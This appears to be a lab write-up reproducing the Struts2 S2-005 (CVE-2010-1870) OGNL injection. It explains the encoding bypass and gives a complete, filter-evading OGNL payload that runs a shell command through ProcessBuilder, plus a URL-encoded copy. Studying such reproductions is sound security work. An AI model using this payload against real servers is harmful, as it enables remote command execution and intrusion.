---
title: CVE-2010-1870【RCE】
author: Ghost
date: 2023-12-10
categories:
  - ['春秋云境', '漏洞靶标']
  - 漏洞复现
tags:
  - 'RCE'
---

## 1. 漏洞介绍

struts2会将http的每个参数名解析为OGNL语句执行(可理解为java代码)。OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(u0023)或8进制(43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这2个选项打开。    

[阿里云漏洞库](https://avd.aliyun.com/detail?id=AVD-2010-1870)

## 2. 漏洞分析    

**原理：**[CVE-2010-1870 S2-005复现 - 美式加糖 - 博客园](https://www.cnblogs.com/peace-and-romance/p/15626196.html)

**利用：**[CVE-2010-1870 S2-005 远程代码执行漏洞-腾讯云开发者社区-腾讯云](https://cloud.tencent.com/developer/article/2197844) 

## 3. 漏洞复现

**payload：**

```Java
redirect:${#req=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletReq'+'uest'),#s=new java.util.Scanner((new java.lang.ProcessBuilder('cat /flag'.toString().split('\\s'))).start().getInputStream()).useDelimiter('\\AAAA'),#str=#s.hasNext()?#s.next():'',#resp=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletRes'+'ponse'),#resp.setCharacterEncoding('UTF-8'),#resp.getWriter().println(#str),#resp.getWriter().flush(),#resp.getWriter().close()}
```

**url 编码后**

```
redirect%3A%24%7B%23req%3D%23context.get%28%27co%27%2B%27m.open%27%2B%27symphony.xwo%27%2B%27rk2.disp%27%2B%27atcher.HttpSer%27%2B%27vletReq%27%2B%27uest%27%29%2C%23s%3Dnew%20java.util.Scanner%28%28new%20java.lang.ProcessBuilder%28%27cat%20%2Fflag%27.toString%28%29.split%28%27%5C%5Cs%27%29%29%29.start%28%29.getInputStream%28%29%29.useDelimiter%28%27%5C%5CAAAA%27%29%2C%23str%3D%23s.hasNext%28%29%3F%23s.next%28%29%3A%27%27%2C%23resp%3D%23context.get%28%27co%27%2B%27m.open%27%2B%27symphony.xwo%27%2B%27rk2.disp%27%2B%27atcher.HttpSer%27%2B%27vletRes%27%2B%27ponse%27%29%2C%23resp.setCharacterEncoding%28%27UTF-8%27%29%2C%23resp.getWriter%28%29.println%28%23str%29%2C%23resp.getWriter%28%29.flush%28%29%2C%23resp.getWriter%28%29.close%28%29%7D
```

![flag.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310041204715.png)
